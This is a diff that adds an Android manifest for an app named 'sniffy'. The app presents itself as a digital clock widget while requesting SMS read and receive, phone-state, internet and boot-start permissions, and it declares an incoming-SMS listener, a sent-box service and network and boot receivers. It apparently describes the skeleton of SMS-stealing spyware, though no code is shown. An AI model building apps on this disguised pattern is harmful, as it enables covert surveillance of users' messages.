@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.app.sniffy"
+    android:versionCode="1"
+    android:versionName="0.4" >
+
+    <uses-sdk
+        android:minSdkVersion="08"
+        android:targetSdkVersion="16" />
+    
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/clock"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme">
+        <activity
+            android:name="com.app.sniffy.MainActivity"
+            android:label="@string/app_name"
+            android:screenOrientation="portrait" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service
+            android:name="com.app.sniffy.SentBoxService"
+            android:enabled="true" >
+        </service>
+        <receiver android:name="com.app.sniffy.SmsListener">
+    		<intent-filter>
+        		<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+    		</intent-filter>
+		</receiver>
+		<receiver android:name="DigiClockWidgetProvider"
+		    android:label="@string/clock_widget" >
+    		<intent-filter>
+        		<action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
+    		</intent-filter>
+    		<intent-filter>
+                <action android:name="com.app.sniffy.CLOCK_WIDGET_UPDATE" />
+            </intent-filter>
+    		<meta-data android:name="android.appwidget.provider"
+               	android:resource="@xml/appwidget_info" />
+		</receiver>
+		<receiver android:name="SquareDigiClockWidgetProvider"
+		    android:label="@string/clock_widget" >
+    		<intent-filter>
+        		<action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
+    		</intent-filter>
+    		<intent-filter>
+                <action android:name="com.app.sniffy.CLOCK_WIDGET_UPDATE" />
+            </intent-filter>
+    		<meta-data android:name="android.appwidget.provider"
+               	android:resource="@xml/squareappwidget_info" />
+		</receiver>
+		<receiver android:name="com.app.sniffy.ConnectionReceiver">
+   			<intent-filter>
+      			<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+      			<action android:name="android.net.wifi.STATE_CHANGE"/>
+   			</intent-filter>
+		</receiver>
+		<receiver
+            android:name="com.app.sniffy.BootUpReceiver"
+            android:enabled="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
